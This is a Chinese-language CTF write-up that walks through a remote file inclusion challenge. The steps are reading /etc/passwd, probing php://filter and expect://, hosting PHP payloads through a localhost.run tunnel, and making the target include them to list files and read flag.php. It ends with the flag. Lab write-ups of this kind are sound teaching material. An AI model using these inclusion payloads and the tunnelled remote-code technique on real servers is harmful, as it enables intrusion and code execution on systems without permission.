🔍 解题过程
第一步：理解题目环境
打开页面，是一个简单的表单，可以输入文件路径并提交。

题目名称是 远程文件包含（RFI），说明目标服务器很可能开启了 allow_url_include，可以包含远程服务器上的文件。

第二步：尝试本地文件包含（LFI）
首先尝试读取本地文件：

text
/etc/passwd
结果：成功读取，显示系统用户信息。
<img width="1919" height="1030" alt="image" src="https://github.com/user-attachments/assets/274d7748-f45d-4f4f-b8c6-d94c5750ca30" />


说明存在文件包含漏洞，且可以读取本地文件。

第三步：尝试读取源码
text
php://filter/convert.base64-encode/resource=index.php
结果：禁止访问敏感目录或文件
<img width="1919" height="1010" alt="image" src="https://github.com/user-attachments/assets/9e4cd1ee-b4ac-478d-a07c-a33e2357f7f4" />


说明 php://filter 被禁止了。

第四步：尝试其他伪协议
text
expect://id
结果：无输出，expect 扩展可能未安装。

第五步：确认 RFI 需要自己搭建服务器
由于本地读取受限，题目明确是 RFI，需要自己准备一个公网可访问的文件，让目标服务器包含并执行。

准备工作：

一个公网可达的地址（用于存放恶意 PHP 文件）
<img width="1289" height="896" alt="image" src="https://github.com/user-attachments/assets/8e665af8-c7d1-4b6d-9dfd-acb819a4121f" />


本地 HTTP 服务


内网穿透工具（如 localhost.run、ngrok）

第六步：搭建本地 HTTP 服务
在 Kali 中创建恶意文件并启动 HTTP 服务：
<img width="1272" height="903" alt="image" src="https://github.com/user-attachments/assets/b39e3408-f5fd-4d3a-aff3-c0a27052dc54" />

bash
# 创建恶意文件
cd /home/kali
echo '<?php phpinfo(); ?>' > shell.txt
<img width="1282" height="903" alt="image" src="https://github.com/user-attachments/assets/1708d064-a7f2-4d3a-a913-88fa72e4f3e8" />


# 启动 HTTP 服务
python3 -m http.server 8080
第七步：内网穿透（使用 localhost.run）
由于 Kali 在虚拟机中，没有公网 IP，需要使用内网穿透工具将本地端口暴露到公网。

bash
# 生成 SSH 密钥（如果没有）
ssh-keygen -t rsa -b 4096 -f ~/.ssh/localhost_run_key -N ""

# 连接 localhost.run
ssh -R 80:localhost:8080 -i ~/.ssh/localhost_run_key localhost.run
连接成功后，会显示公网地址：

text
https://xxxxx.lhr.life tunneled with tls termination, https://xxxxx.lhr.life
记下这个地址。

第八步：测试 RFI 是否可用
在题目输入框中输入：

text
https://xxxxx.lhr.life/shell.txt
结果：成功显示 phpinfo() 页面，包含 PHP 版本、配置等信息。

说明 RFI 可用，目标服务器可以包含并执行远程 PHP 代码。

第九步：查看目标目录
修改 shell.txt 内容：

bash
echo '<?php var_dump(scandir(".")); ?>' > shell.txt
再次在题目中包含：

text
https://xxxxx.lhr.life/shell.txt
结果：

text
array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(8) "flag.php" [3]=> string(9) "index.php" }
发现当前目录下有 flag.php 文件。

第十步：读取 flag
修改 shell.txt 内容：

bash
echo '<?php highlight_file("flag.php"); ?>' > shell.txt
再次在题目中包含：

text
https://xxxxx.lhr.life/shell.txt
结果：成功显示 flag.php 的源码，flag 在文件中。
<img width="1903" height="1018" alt="image" src="https://github.com/user-attachments/assets/9b0163ed-56df-4aca-928d-1f5acfc04c1e" />


🏁 Flag
text
CTF{http_rfi_1s_fun}
